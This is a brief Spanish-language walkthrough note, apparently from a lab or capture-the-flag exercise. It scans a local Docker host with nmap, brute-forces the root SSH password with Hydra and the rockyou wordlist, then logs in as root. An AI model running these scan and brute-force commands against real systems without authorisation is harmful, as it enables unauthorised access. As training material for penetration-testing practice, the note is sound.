1. Realizamos un [[00. Apuntes/01. Herramientas/NMAP|NMAP]] hacia la IP objetivo:
`nmap -p- -sS -sCV --min-rate 5000 -n -vvv -Pn <IP> -oN <NombreFichero>
![[Pasted image 20241117183809.png]]

2.  Realizamos un ataque por fuerza bruta ([[HYDRA]]) al usuario root por SSH:
` hydra -l root  -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2`
![[Pasted image 20241117184017.png]]

3.  Accedemos mediante SSH al usuario root:
`ssh root@IP`

